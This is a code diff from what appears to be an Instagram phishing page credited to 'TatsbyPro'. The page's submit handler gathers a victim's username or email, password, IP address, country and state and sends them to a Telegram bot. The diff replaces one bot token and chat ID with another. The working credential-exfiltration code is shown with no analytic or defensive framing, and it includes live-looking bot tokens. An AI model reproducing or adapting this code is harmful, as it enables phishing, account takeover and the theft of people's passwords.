@@ -21,8 +21,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Instagram Result from TatsbyPro with IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "8658137794:AAG8ZTv2Mugbr9OpvS_HzympxdIo5RjMdAc";
-        var chat_id = -5207478006;
+        var token = "8767738507:AAHPzk9CMWbG8OlKuVPMCwVqFnf6PH_YLT0";
+        var chat_id = -5220506744;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
